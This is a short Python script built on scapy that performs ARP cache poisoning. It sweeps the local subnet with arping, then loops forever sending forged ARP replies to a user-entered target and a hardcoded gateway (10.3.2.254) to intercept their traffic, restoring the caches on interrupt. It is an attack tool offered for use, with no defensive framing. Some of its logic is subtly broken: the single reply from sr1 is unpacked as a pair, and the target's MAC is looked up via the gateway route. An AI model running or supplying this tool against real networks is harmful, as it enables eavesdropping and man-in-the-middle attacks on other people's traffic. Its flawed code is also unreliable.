from scapy.layers.l2 import *
from scapy.sendrecv import send, sr1

def spoofarpcache(targetip, targetmac, sourceip):
	spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
	results, unans = sr1(spoofed, verbose= False)
	print(results)

def restorearp(targetip, targetmac, sourceip, sourcemac):
	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
	results, unans = sr1(packet, verbose=False)
	print(results)
	print("ARP Table restored to normal for", targetip)

def MultiSniffing():
	ipt = {}
	ip = ".".join(conf.route.route("0.0.0.0")[1].split(".")[:-1]) + "."
	for num in range(1, 254):
		if str(arping(ip + str(num))[0])[-2] != "0":
			ipt[ip + str(num)] = getmacbyip(ip + str(num))
	print(ipt)


def SingleSniffing(targetip):
	if str(arping(targetip)[0])[-2] != "0" :
		targetmac = getmacbyip(conf.route.route("0.0.0.0")[1])
		gatewayip = "10.3.2.254"  #conf.route.route(targetip)[2]
		gatewaymac = getmacbyip(conf.route.route("10.3.2.254")[2])
		try:
			print("Sending spoofed ARP responses")
			while True:
				spoofarpcache(targetip, targetmac, gatewayip)
				spoofarpcache(gatewayip, gatewaymac, targetip)
		except KeyboardInterrupt:
			print("ARP spoofing stopped")
			restorearp(gatewayip, gatewaymac, targetip, getmacbyip(targetip))
			restorearp(targetip, targetmac, gatewayip, gatewaymac)
			quit()
	else:
		print("Ip not reachable")


SingleSniffing(input("Which ip : "))